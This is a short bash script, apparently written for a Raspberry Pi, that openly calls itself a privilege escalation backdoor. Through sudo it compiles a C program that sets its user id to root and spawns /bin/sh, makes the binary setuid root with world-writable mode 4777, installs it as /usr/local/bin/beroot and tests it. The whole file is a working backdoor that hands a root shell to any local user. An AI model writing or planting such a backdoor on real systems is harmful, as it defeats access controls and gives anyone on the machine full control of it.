#!/bin/bash

# create a privilege escalation backdoor bin
#
#  pi@psi:~ $ /usr/local/bin/beroot                                                                                 │·············
#  # whoami                                                                                                         │·············
#  root
#  #


/usr/bin/sudo id | grep --quiet "uid=0(root)" || { rpilogit "ERROR can not sudo"; exit 1; }

where_gcc=$(which gcc || exit 1)

TMPFILE="devtest.c"
FILEDEST="/usr/local/bin/beroot"
TMPDIR=$(mktemp -d)
CURWD=$(pwd)
cd $TMPDIR || exit 1;

# create suid laucher c
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPFILE

# compile
$where_gcc $TMPFILE -o suid 2>/dev/null

rm -f $TMPFILE

sudo chown root:root suid

sudo chmod 4777 suid

sudo mv -v suid $FILEDEST

# test
echo 'whoami && hostname' | $FILEDEST

cd $CURWD

# clean up
rm -rf -- $TMPDIR